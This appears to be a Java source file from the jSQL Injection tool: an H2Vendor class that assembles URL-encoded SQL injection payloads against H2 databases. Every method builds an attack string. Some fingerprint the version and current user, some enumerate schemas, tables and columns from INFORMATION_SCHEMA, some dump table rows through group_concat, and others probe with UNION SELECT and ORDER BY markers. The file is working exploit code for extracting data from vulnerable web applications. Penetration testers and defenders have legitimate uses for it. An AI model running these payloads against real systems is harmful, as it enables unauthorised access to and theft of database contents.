package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TD_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.model.injection.strategy.Strategy;
import com.jsql.util.StringUtil;

public class H2Vendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "concat(" +
                "" +
                    "concat_ws(" +
                        "'"+ SEPARATOR_SQL +"'," +
                        "H2VERSION()," +
                        "database()," +
                        "user()" +
                    ")" +
                "" +
                "," +
                "'"+ TRAIL_SQL +"'" +
            ")";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'"+ SEPARATOR_SQL +"'||" +
                        "r||" +
                        "'"+ QTE_SQL +"'||" +
                        "cast(q+as+char)||" +
                        "'"+ SEPARATOR_SQL +"'" +
                        "+order+by+r+" +
                        "separator+'"+ TD_SQL +"'" +
                    ")," +
                    "'"+ TRAIL_SQL +"'" +
                ")" +
            "from(" +
                "select+" +
                    "cast(TABLE_SCHEMA+as+char)r," +
                    "count(TABLE_NAME)q+" +
                "from+" +
                    "INFORMATION_SCHEMA.tables+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'"+ SEPARATOR_SQL +"'||" +
                        "cast(r+as+char)||" +
                        "'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'+" +
                        "order+by+r+" +
                        "separator+'"+ TD_SQL +"'" +
                    ")," +
                    "'"+ TRAIL_SQL +"'" +
                ")" +
            "from(" +
                "select+" +
                    "TABLE_NAME+r+" +
                "from+" +
                    "information_schema.tables+" +
                "where+" +
                    "TABLE_SCHEMA='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'"+ SEPARATOR_SQL +"'||" +
                        "cast(n+as+char)||" +
                        "'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'+" +
                        "order+by+n+" +
                        "separator+'"+ TD_SQL +"'" +
                    ")," +
                    "'"+ TRAIL_SQL +"'" +
                ")" +
            "from(" +
                "select+" +
                    "COLUMN_NAME+n+" +
                "from+" +
                    "information_schema.columns+" +
                "where+" +
                    "TABLE_SCHEMA='" + table.getParent() + "'+" +
                    "and+" +
                    "TABLE_NAME='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        // character 7f, last available hexa character (starting at character 80, it gives ?)
        formatListColumn = formatListColumn.replace("{%}", "`,'')),'%7f',trim(ifnull(`");
        
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,''))";
        
        return
            "select+concat(" +
                "group_concat(" +
                    "'"+ SEPARATOR_SQL +"'||" +
                    "r||" +
                    "'"+ QTE_SQL +"'||" +
                    "cast(q+as+char)||" +
                    "'"+ SEPARATOR_SQL +"'" +
                    "+order+by+r+separator+'"+ TD_SQL +"'" +
                ")," +
                "'"+ TRAIL_SQL +"'" +
            ")from(" +
                "select+" +
                    "cast(concat(" + formatListColumn + ")as+char)r," +
                    "count(*)q+" +
                "from+" +
                    "`" + database + "`.`" + table + "`+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
        "(" +
            "select+" +
                /**
                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                 */
                "concat(" +
                    "'SQLi'," +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        /**
                         * Minus 'SQLi' should apply
                         */
                        Strategy.NORMAL.instance().getPerformanceLength() +
                    ")" +
                ")" +
        ")";
    }

    @Override
    public String getSqlCapacity(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select+concat('SQLi',$1,repeat('%23',65536),'"+ TRAIL_SQL +"'))"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("''||1337"+ i +"7330%2b1");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }
}